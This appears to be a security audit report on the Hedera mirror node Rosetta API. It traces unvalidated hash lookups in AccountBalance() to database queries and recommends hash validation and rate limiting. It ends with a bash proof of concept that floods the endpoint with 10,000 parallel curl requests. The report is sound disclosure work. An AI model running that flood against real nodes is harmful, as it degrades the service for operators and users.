### Title
Unauthenticated Hash-Only Block Lookup Causes Unbounded DB Queries via `AccountBalance()`

### Summary
`AccountBalance()` accepts a `BlockIdentifier` containing only a hash field with no format or length validation beyond an empty-string check. Any unprivileged caller can supply an arbitrary hash (e.g., `0xffff...ffff`) that will never match a real block, causing `findBlockByHash()` to execute a full database query on every request and return `ErrBlockNotFound`. Because the application-level rate limiting middleware is disabled by default (`global.middleware: false`), this path is open to repeated abuse with no throttle.

### Finding Description

**Exact code path:**

1. `AccountBalance()` — `rosetta/app/services/account_service.go` lines 52–53:
   ```go
   if request.BlockIdentifier != nil {
       block, rErr = a.RetrieveBlock(ctx, request.BlockIdentifier)
   ```
   No pre-validation of `BlockIdentifier` fields before delegation.

2. `RetrieveBlock()` — `rosetta/app/services/base_service.go` lines 84–86:
   ```go
   } else if bIdentifier.Index == nil && bIdentifier.Hash != nil {
       h := tools.SafeRemoveHexPrefix(*bIdentifier.Hash)
       return b.blockRepo.FindByHash(ctx, h)
   ```
   When only `Hash` is supplied (no `Index`), the hex prefix is stripped and the raw string is forwarded directly.

3. `FindByHash()` — `rosetta/app/persistence/block.go` lines 135–144:
   ```go
   func (br *blockRepository) FindByHash(ctx context.Context, hash string) (*types.Block, *rTypes.Error) {
       if hash == "" {
           return nil, hErrors.ErrInvalidArgument
       }
       ...
       return br.findBlockByHash(ctx, hash)
   }
   ```
   The **only** guard is an empty-string check. Any non-empty string — including `"ffff...ffff"` of arbitrary length — passes through.

4. `findBlockByHash()` — `rosetta/app/persistence/block.go` lines 226–232:
   ```go
   if err := db.Raw(selectByHashWithIndex, sql.Named("hash", hash)).First(rb).Error; err != nil {
       return nil, handleDatabaseError(err, hErrors.ErrBlockNotFound)
   }
   ```
   A full `SELECT … FROM record_file WHERE hash = @hash` is executed. For a non-existent hash the DB returns `gorm.ErrRecordNotFound`, which maps to `ErrBlockNotFound` — returned to the caller.

**Root cause / failed assumption:** The code assumes callers supply hashes that correspond to real blocks, or that an external rate-limiter will absorb abuse. Neither assumption holds: there is no hash format/length validation at the application layer, and the Traefik middleware chain (which includes `rateLimit: average: 10` and `inFlightReq: amount: 5`) is gated on `global.middleware: false` in `charts/hedera-mirror-rosetta/values.yaml` line 95 — **disabled by default**.

### Impact Explanation

Each crafted request forces one (or two, counting `initGenesisRecordFile` on cold start) database round-trips that return nothing. An attacker sending a sustained flood of such requests amplifies DB read load proportionally to request rate. Because the endpoint is publicly reachable (`/rosetta/account/balance`) and requires no credentials, the cost to the attacker is negligible while the cost to the operator is real DB connection pool pressure and I/O. No user funds or ledger state are affected; the impact is availability degradation (griefing / resource exhaustion) with no economic damage to network participants.

### Likelihood Explanation

Preconditions are minimal: a valid account address (any existing account ID such as `0.0.2`) and an HTTP client. The hash value `0xffff...ffff` (or any other non-existent string) is trivially constructed. The attack is stateless, requires no authentication, and is fully repeatable. Without the Traefik middleware enabled, there is no application-side throttle. Even with the middleware enabled, the `requestHost`-scoped rate limit can be bypassed by rotating source IPs or hostnames.

### Recommendation

1. **Add hash format validation in `FindByHash()`**: reject inputs that do not match the expected hex-encoded SHA-384 format (96 hex characters) before issuing any DB query.
   ```go
   if len(hash) != 96 || !isHex(hash) {
       return nil, hErrors.ErrInvalidArgument
   }
   ```
2. **Enable the middleware by default**: change `global.middleware` default to `true` in `charts/hedera-mirror-rosetta/values.yaml` so the `rateLimit` and `inFlightReq` Traefik middlewares are active in all deployments.
3. **Add application-level rate limiting** independent of the ingress layer so the protection cannot be bypassed by direct pod access.

### Proof of Concept

```bash
# Requires: curl, a running Rosetta node with no middleware enabled

ROSETTA_URL="http://<rosetta-host>/account/balance"
PAYLOAD='{
  "network_identifier": {"blockchain":"Hedera","network":"mainnet"},
  "account_identifier": {"address":"0.0.2"},
  "block_identifier": {"hash":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
}'

# Single request — always returns ErrBlockNotFound, always hits the DB
curl -s -X POST "$ROSETTA_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

# Flood — no rate limit stops this without middleware enabled
for i in $(seq 1 10000); do
  curl -s -X POST "$ROSETTA_URL" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" &
done
wait
```

Every iteration executes `SELECT … FROM record_file WHERE hash = 'ffff…ffff'` against the database, returns `{"code":…,"message":"Block not found"}`, and exits — with no server-side throttle applied. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)
